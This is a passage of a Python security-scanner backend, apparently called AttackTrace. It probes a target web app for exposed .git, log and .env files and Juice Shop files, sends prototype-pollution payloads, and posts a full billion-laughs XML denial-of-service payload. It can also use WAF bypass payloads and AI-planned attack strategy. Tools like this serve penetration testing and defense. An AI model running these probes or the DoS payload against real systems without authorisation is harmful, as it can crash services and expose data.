                        f"Git Repository Metadata Exposed: {path}",
                        f"Git file at {url} is publicly accessible. "
                        f"Full source code may be reconstructable from the .git directory.",
                        f"URL: {url}\nContent: {body[:200]}",
                        url, True,
                        "Block access to the .git directory via web server config. "
                        "Add `deny all` for /.git/ in nginx/Apache.",
                        confidence="high")
                    continue

                if path in ("/access.log", "/error.log", "/logs/access.log") or "access.log" in path:
                    if any(ind in body for ind in ["GET /", "POST /", "HTTP/1.1"]):
                        yield _finding("info_disclosure", "log_file_exposed", "high",
                            f"Server Log File Exposed: {path}",
                            f"Server access log at {url} is publicly accessible. "
                            f"Internal paths, user IPs, and request details are exposed.",
                            f"URL: {url}\nPreview: {body[:300]}",
                            url, True,
                            "Store logs outside the web root. Restrict access to log files.",
                            confidence="high")
                    continue

                if path == "/robots.txt":
                    # Robots.txt can reveal hidden paths
                    disallowed = [line.split(":", 1)[1].strip() for line in body.split("\n")
                                  if line.lower().startswith("disallow:")]
                    if disallowed:
                        yield _finding("info_disclosure", "robots_disallowed_paths", "info",
                            "robots.txt Reveals Hidden Paths",
                            f"robots.txt at {url} lists {len(disallowed)} Disallowed path(s). "
                            f"These paths are worth investigating for sensitive content.",
                            f"URL: {url}\nDisallowed paths: {disallowed[:10]}",
                            url, False,
                            "Review all Disallowed paths in robots.txt for sensitive content. "
                            "robots.txt is public — do not use it to hide sensitive endpoints.",
                            confidence="low")
                    continue

                if path == "/.well-known/security.txt":
                    yield _finding("info_disclosure", "security_txt_present", "info",
                        "security.txt Found",
                        f"Security policy file at {url} is present. Contains contact info for reporting vulnerabilities.",
                        f"URL: {url}\nContent: {body[:200]}",
                        url, False,
                        "Good security practice. Ensure the contact information is current.",
                        confidence="low")
                    continue

                # Generic: sensitive file accessible
                indicators = INFO_DISCLOSURE_INDICATORS.get(path, [])
                if indicators and any(ind in body for ind in indicators):
                    yield _finding("info_disclosure", "sensitive_file_exposed", "high",
                        f"Sensitive File Exposed: {path}",
                        f"File at {url} is publicly accessible and contains sensitive data.",
                        f"URL: {url}\nSize: {len(r.content)} bytes\nPreview: {body[:200]}",
                        url, True,
                        "Remove sensitive files from the web root. Use deployment pipelines "
                        "to prevent secrets and config files from being deployed publicly.",
                        confidence="medium")

            elif r.status_code == 403:
                # 403 means the file exists but is blocked — still worth noting for critical paths
                if path in ("/.env", "/.git/config", "/.htpasswd"):
                    yield _finding("info_disclosure", "sensitive_path_blocked", "info",
                        f"Sensitive Path Exists but Blocked: {path}",
                        f"GET {url} returned 403. The path exists — verify the block is complete "
                        f"(not bypassable via path traversal or method override).",
                        f"URL: {url}\nStatus: 403",
                        url, False,
                        "Ensure the block cannot be bypassed. Test with X-Original-URL, "
                        "X-Rewrite-URL, and path traversal variants.",
                        confidence="low")

        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # Test for specific Juice Shop files via direct GET
    juice_files = [
        ("/ftp/acquisitions.md", "confidential", "Acquisitions document found in /ftp"),
        ("/ftp/eastere.gg", "L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybWxoL2x3ZWo=", "Juice Shop Easter Egg file"),
        ("/ftp/coupons_2013.md.bak", "coupon", "Forgotten sales backup with coupon codes"),
        ("/ftp/package.json.bak", '"juiceshop"', "Developer forgot package.json backup in FTP"),
    ]
    for path, indicator, description in juice_files:
        try:
            r = await client.get(target + path, timeout=6)
            if r.status_code == 200 and (indicator in r.text or len(r.content) > 10):
                yield _finding("info_disclosure", "forgotten_file_" + path.split("/")[-1].replace(".", "_"),
                    "high", f"Forgotten File Exposed: {path}",
                    description + f". File is publicly accessible without authentication.",
                    f"URL: {target + path}\nSize: {len(r.content)} bytes\nPreview: {r.text[:200]}",
                    target + path, True,
                    "Remove all sensitive files from the /ftp and similar public directories. "
                    "Audit web-accessible directories regularly.",
                    confidence="high")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)


# ── Module: Insecure Deserialization ─────────────────────────────────────────

async def _module_deserialization(target: str, client: httpx.AsyncClient,
                                   forms: list[dict]) -> AsyncGenerator[dict, None]:
    """Test for insecure deserialization, prototype pollution, and zip/XML bombs."""

    # Test 1: Prototype pollution via JSON body
    prototype_test_endpoints = [
        "/api/users", "/api/register", "/api/v1/users",
        "/api/profile", "/api/settings",
        "/rest/user/login",
    ]
    for path in prototype_test_endpoints[:4]:
        url = target + path
        for payload in PROTOTYPE_POLLUTION_PAYLOADS[:3]:
            if not isinstance(payload, dict):
                continue
            try:
                r = await client.post(url, json=payload, timeout=8)
                if r.status_code in (200, 201):
                    try:
                        data = r.json()
                        if isinstance(data, dict):
                            if data.get("isAdmin") or data.get("role") == "admin" or data.get("admin"):
                                yield _finding("deserialization", "prototype_pollution_admin", "critical",
                                    f"Prototype Pollution — Admin Privilege Escalation via {path}",
                                    f"POST {url} with `{payload}` returned admin=true or isAdmin=true. "
                                    f"Prototype pollution can overwrite global object properties.",
                                    f"URL: {url}\nPayload: {payload}\nResponse: {str(data)[:200]}",
                                    url, True,
                                    "Freeze Object.prototype in Node.js: `Object.freeze(Object.prototype)`. "
                                    "Use JSON schema validation to reject __proto__ keys.",
                                    confidence="medium")
                    except Exception:
                        pass
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # Test 2: Prototype pollution via URL query params
    for path in prototype_test_endpoints[:2]:
        url = target + path
        for pp_param in PROTOTYPE_POLLUTION_PAYLOADS:
            if isinstance(pp_param, str):
                try:
                    r = await client.get(f"{url}?{pp_param}", timeout=6)
                    if r.status_code == 200:
                        try:
                            data = r.json()
                            if isinstance(data, dict) and (data.get("isAdmin") or data.get("role") == "admin"):
                                yield _finding("deserialization", "prototype_pollution_url", "high",
                                    "Prototype Pollution via URL Query Parameter",
                                    f"URL query parameter `{pp_param}` caused prototype pollution. "
                                    f"Response indicates admin privileges were granted.",
                                    f"URL: {url}?{pp_param}\nResponse: {str(data)[:200]}",
                                    url, True,
                                    "Sanitize URL query parameters. Reject keys containing __proto__ or constructor.",
                                    confidence="medium")
                        except Exception:
                            pass
                except httpx.HTTPError:
                    pass
                await asyncio.sleep(0)

    # Test 3: XML billion laughs via B2B endpoint
    billion_laughs = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>&lol4;</root>"""
    b2b_url = target + "/b2b/v2/orders"
    try:
        r = await asyncio.wait_for(
            client.post(b2b_url,
                content=billion_laughs.encode(),
                headers={"Content-Type": "application/xml"}),
            timeout=3.0
        )
        if r.status_code not in (404, 405, 501):
            yield _finding("deserialization", "xml_billion_laughs_endpoint", "high",
                "B2B Endpoint May Accept Billion Laughs XML DoS",
                f"POST {b2b_url} returned {r.status_code} for XML input. "
                f"If the XML parser processes entity expansion, a billion laughs attack "
                f"can cause CPU/memory exhaustion.",
                f"URL: {b2b_url}\nStatus: {r.status_code}",
                b2b_url, True,
                "Set entity expansion limits in XML parser. "
                "Use FEATURE_SECURE_PROCESSING in Java. Limit entity depth to 1-2 levels.",
                confidence="low")
    except asyncio.TimeoutError:
        # Timeout means the server hung processing the entity expansion
        yield _finding("deserialization", "xml_dos_confirmed", "critical",
            "XML DoS (Billion Laughs) Confirmed at B2B Endpoint",
            f"POST {b2b_url} with billion laughs XML payload caused the server to hang "
            f"(no response within 3s). CPU/memory exhaustion DoS is exploitable.",
            f"URL: {b2b_url}\nPayload: XML with 4-level entity expansion\n"
            f"Evidence: Server did not respond within 3 seconds",
            b2b_url, True,
            "Disable entity expansion in XML parser. Set expansion limit to 1. "
            "Use XMLConstants.FEATURE_SECURE_PROCESSING.",
            confidence="high")
    except Exception:
        pass


# ── Main Stream ───────────────────────────────────────────────────────────────

async def _stream_attack_suite(scan_id: str, req: AttackSuiteRequest) -> AsyncGenerator[str, None]:
    start_time = time.monotonic()
    findings: list[dict] = []
    counts: dict[str, int] = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}

    yield _sse("start", {
        "scan_id": scan_id, "target": req.target,
        "modules": req.modules, "timestamp": datetime.now(timezone.utc).isoformat(),
    })

    _scan_history[scan_id] = {
        "id": scan_id, "target": req.target, "modules": req.modules,
        "status": "running", "started_at": datetime.now(timezone.utc).isoformat(),
        "findings": [], "counts": counts, "crawl": {},
    }

    def emit(f: dict):
        findings.append(f)
        sev = f.get("severity", "info").lower()
        counts[sev] = counts.get(sev, 0) + 1
        _scan_history[scan_id]["findings"] = findings
        _scan_history[scan_id]["counts"] = counts

    headers = dict(req.auth_headers)
    headers.setdefault("User-Agent", "AttackTrace-Security-Scanner/2.0")

    # Short connect timeout ensures unreachable targets fail fast
    _timeout = httpx.Timeout(connect=4.0, read=float(req.timeout),
                              write=float(req.timeout), pool=5.0)

    async with httpx.AsyncClient(headers=headers, timeout=_timeout,
                                  follow_redirects=req.follow_redirects,
                                  verify=False) as client:

        # ── Login ──────────────────────────────────────────────────────────
        auth_headers: dict[str, str] = {}
        if req.login.enabled:
            yield _sse("progress", {"message": "🔐 Performing login...", "module": "login"})
            try:
                auth_headers = await _perform_login(client, req.login, req.target)
                if auth_headers:
                    client.headers.update(auth_headers)
                    yield _sse("progress", {
                        "message": f"✅ Login successful. Auth type: {list(auth_headers.keys())[0]}",
                        "module": "login"
                    })
                else:
                    yield _sse("progress", {"message": "⚠️ Login attempted but no session captured.", "module": "login"})
            except Exception as e:
                yield _sse("progress", {"message": f"Login error: {e}", "module": "login"})

        # ── Second account client ──────────────────────────────────────────
        client2: Optional[httpx.AsyncClient] = None
        if req.account2.enabled:
            acc2_headers: dict[str, str] = {}
            if req.account2.bearer_token:
                acc2_headers["Authorization"] = f"Bearer {req.account2.bearer_token}"
            elif req.account2.cookie:
                acc2_headers["Cookie"] = req.account2.cookie
            elif req.account2.login_type == "rest_json" and req.account2.login_url and req.account2.username:
                # REST JSON login for second account
                try:
                    acc2_cfg = LoginConfig(
                        enabled=True,
                        login_url=req.account2.login_url,
                        username=req.account2.username,
                        password=req.account2.password,
                        login_type="rest_json",
                        token_path=req.account2.token_path,
                    )
                    acc2_auth = await _perform_login(client, acc2_cfg, req.target)
                    if acc2_auth:
                        acc2_headers.update(acc2_auth)
                        yield _sse("progress", {
                            "message": f"✅ Account 2 login successful (REST JSON).",
                            "module": "login"
                        })
                    else:
                        yield _sse("progress", {"message": "⚠️ Account 2 login failed — no token returned.", "module": "login"})
                except Exception as e:
                    yield _sse("progress", {"message": f"Account 2 login error: {e}", "module": "login"})
            elif req.account2.login_type == "form" and req.account2.login_url and req.account2.username:
                try:
                    acc2_cfg = LoginConfig(
                        enabled=True,
                        login_url=req.account2.login_url,
                        username=req.account2.username,
                        password=req.account2.password,
                        login_type="form",
                    )
                    acc2_auth = await _perform_login(client, acc2_cfg, req.target)
                    if acc2_auth:
                        acc2_headers.update(acc2_auth)
                except Exception:
                    pass

            if acc2_headers:
                client2 = httpx.AsyncClient(headers={**headers, **acc2_headers},
                                             timeout=_timeout, verify=False)

        # ── Connectivity probe ─────────────────────────────────────────────
        try:
            await client.head(req.target, timeout=httpx.Timeout(connect=4.0, read=5.0, write=5.0, pool=5.0))
        except (httpx.ConnectError, httpx.ConnectTimeout):
            yield _sse("error", {"message": f"Target {req.target} is unreachable. Check the URL and try again."})
            return

        # ── SPA Detection ──────────────────────────────────────────────────
        spa_fallback_size = await _detect_spa_fallback(req.target, client)
        if spa_fallback_size > 0:
            yield _sse("progress", {
                "message": f"⚠️ SPA detected (catch-all routing, fallback size={spa_fallback_size}b). "
                           f"Path-based tests will filter false positives automatically.",
                "module": "spa_detection"
            })

        # ── WAF Detection ──────────────────────────────────────────────────
        yield _sse("progress", {"message": "🛡️ Detecting WAF...", "module": "waf"})
        waf_info = await detect_waf(req.target)
        yield _sse("waf_detected", waf_info)
        if waf_info["detected"]:
            yield _sse("progress", {
                "message": f"🛡️ WAF detected: {waf_info['vendor'] or 'Unknown'} (confidence: {waf_info['confidence']}). "
                           f"Enabling bypass payloads for XSS and SQLi.",
                "module": "waf"
            })
        else:
            yield _sse("progress", {
                "message": "🛡️ No WAF detected.",
                "module": "waf"
            })

        # ── Crawl ──────────────────────────────────────────────────────────
        crawl_result = CrawlResult()
        if "crawl" in req.modules and req.crawler.enabled:
            yield _sse("progress", {
                "message": f"🕷️ Starting crawler (max depth={req.crawler.max_depth}, "
                           f"max pages={req.crawler.max_pages})...",
                "module": "crawl"
            })
            try:
                crawl_result = await _crawl(req.target, client, req.crawler)
                yield _sse("crawl_complete", {
                    "pages": len(crawl_result.pages),
                    "forms": len(crawl_result.forms),
                    "endpoints": len(crawl_result.endpoints),
                    "tech_stack": crawl_result.tech_stack,
                    "ids_found": len(crawl_result.ids_found),
                })
                yield _sse("progress", {
                    "message": f"✅ Crawl complete: {len(crawl_result.pages)} pages, "
                               f"{len(crawl_result.forms)} forms, "
                               f"{len(crawl_result.endpoints)} endpoints. "
                               f"Tech: {', '.join(crawl_result.tech_stack) or 'unknown'}",
                    "module": "crawl"
                })
                _scan_history[scan_id]["crawl"] = {
                    "pages": len(crawl_result.pages),
                    "forms": len(crawl_result.forms),
                    "endpoints": list(crawl_result.endpoints)[:50],
                    "tech_stack": crawl_result.tech_stack,
                }
            except Exception as e:
                yield _sse("progress", {"message": f"Crawler error: {e}", "module": "crawl"})

        # ── AI Strategy Planning ───────────────────────────────────────────
        if req.ai_analysis and crawl_result.tech_stack:
            yield _sse("progress", {"message": "🤖 AI analyzing target and planning attack strategy...", "module": "ai"})
            try:
                plan = await _ai_plan_attack(
                    req.target, crawl_result.tech_stack,
                    list(crawl_result.endpoints)[:20], req.modules
                )
                if plan:
                    yield _sse("ai_plan", {"plan": plan, "tech_stack": crawl_result.tech_stack})
                    yield _sse("progress", {"message": f"🤖 AI Strategy: {plan[:150]}...", "module": "ai"})
            except Exception as e:
                yield _sse("progress", {"message": f"AI planning skipped: {e}", "module": "ai"})

        # ── Run modules ────────────────────────────────────────────────────
        # Collect WAF-specific bypass payloads for relevant modules
        _waf_xss_extra = get_waf_bypass_payloads(waf_info.get("vendor"), "xss")
        _waf_sqli_extra = get_waf_bypass_payloads(waf_info.get("vendor"), "sqli")

        module_runners = {
            "headers":   lambda: _module_headers(req.target, client),
            "cors":      lambda: _module_cors(req.target, client),
            "csrf":      lambda: _module_csrf(req.target, client, crawl_result.forms),
            "xss":       lambda _x=_waf_xss_extra: _module_xss(req.target, client, crawl_result.forms, _x),
            "sqli":      lambda _s=_waf_sqli_extra: _module_sqli(req.target, client, crawl_result.forms, _s),
            "ssrf":      lambda: _module_ssrf(req.target, client),
            "idor":      lambda: _module_idor(req.target, client, client2,
                                               crawl_result.endpoints, crawl_result.ids_found,
                                               spa_fallback_size),
            "privilege": lambda: _module_privilege(req.target, client, crawl_result.forms,
                                                    spa_fallback_size),
            "account":   lambda: _module_account_takeover(req.target, client, spa_fallback_size),
            "cache":     lambda: _module_cache(req.target, client),
            "race":      lambda: _module_race(req.target, client),
            "business":  lambda: _module_business(req.target, client, crawl_result.forms),
            "graphql":   lambda: _module_graphql(req.target, client),
            "jwt":       lambda: _module_jwt(req.target, client, {**req.auth_headers, **auth_headers}),
            "redirect":  lambda: _module_redirect(req.target, client),
            "auth_bypass": lambda: _module_auth_bypass(req.target, client, spa_fallback_size),
            "takeover":  lambda: _module_takeover(req.target, client),
            "nosql":        lambda: _module_nosql(req.target, client, crawl_result.forms),
            "ssti":         lambda: _module_ssti(req.target, client, crawl_result.forms),
            "xxe":          lambda: _module_xxe(req.target, client),
            "file_upload":  lambda: _module_file_upload(req.target, client, spa_fallback_size),
            "broken_auth":  lambda: _module_broken_auth(req.target, client),
            "info_disclosure": lambda: _module_info_disclosure(req.target, client, spa_fallback_size),
            "deserialization": lambda: _module_deserialization(req.target, client, crawl_result.forms),
        }

        for mod_id in req.modules:
            if mod_id == "crawl" or mod_id not in module_runners:
                continue
            meta = next((m for m in MODULES_META if m["id"] == mod_id), {"label": mod_id})
            yield _sse("progress", {"message": f"▶ Running: {meta['label']}...", "module": mod_id})
            try:
                async for finding in module_runners[mod_id]():
                    emit(finding)
                    yield _sse("finding", finding)
                    await asyncio.sleep(0)
            except Exception as e:
                yield _sse("progress", {"message": f"Module {mod_id} error: {e}", "module": mod_id})
            yield _sse("progress", {"message": f"✓ {meta['label']} done.", "module": mod_id})

        if client2:
            await client2.aclose()

    duration = round(time.monotonic() - start_time, 1)
    _scan_history[scan_id].update({
        "status": "completed",
        "completed_at": datetime.now(timezone.utc).isoformat(),
        "findings": findings, "counts": counts, "duration_seconds": duration,
    })

    yield _sse("complete", {
        "scan_id": scan_id, "total_findings": len(findings),
        "counts": counts, "duration_seconds": duration,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "waf_info": waf_info,
    })


# ── Endpoints ─────────────────────────────────────────────────────────────────

@router.post("/scan")
async def run_attack_suite(
    payload: AttackSuiteRequest,
    current_user: Annotated[User, Depends(require_tool("attack_suite"))],
) -> StreamingResponse:
    scan_id = str(uuid.uuid4())
    return StreamingResponse(
        _stream_attack_suite(scan_id, payload),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "Connection": "keep-alive",
                 "X-Accel-Buffering": "no"},
    )


@router.get("/scans")
async def list_attack_scans(
    current_user: Annotated[User, Depends(get_current_user)],
) -> dict:
    scans = sorted(_scan_history.values(), key=lambda s: s.get("started_at", ""), reverse=True)
    return {"items": scans, "total": len(scans)}


@router.get("/scans/{scan_id}")
async def get_attack_scan(
    scan_id: str,
    current_user: Annotated[User, Depends(get_current_user)],
) -> dict:
    scan = _scan_history.get(scan_id)
    if not scan:
        raise HTTPException(status_code=404, detail="Scan not found")
    return scan


@router.get("/modules")
async def list_modules(
    current_user: Annotated[User, Depends(get_current_user)],
) -> dict:
    return {"modules": MODULES_META}


# ─── Burp Suite analyser ──────────────────────────────────────────────────────

@router.post("/burp/analyze")
async def analyze_burp_file(
    file: UploadFile = File(...),
    ai_analysis: bool = Form(default=True),
    current_user: Annotated[User, Depends(require_tool("burp_analyzer"))] = None,
) -> StreamingResponse:
    """
    Upload a Burp Suite HTTP History XML export and receive a streaming SSE
    analysis: parsed stats → endpoint profiles → response findings →
    per-endpoint test cases → Claude AI insights → completion summary.

    Export from Burp: Proxy → HTTP history → Ctrl-A → Right-click → Save items
    """
    from app.api.v1.burp_analyzer import run_burp_analysis  # local import avoids circular deps

    content = await file.read()
    if len(content) > 500 * 1024 * 1024:
        raise HTTPException(status_code=413, detail="File too large — maximum 500 MB")

    api_key = settings.ANTHROPIC_API_KEY or ""

    return StreamingResponse(
        run_burp_analysis(content, ai_analysis, api_key),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no",
        },
    )
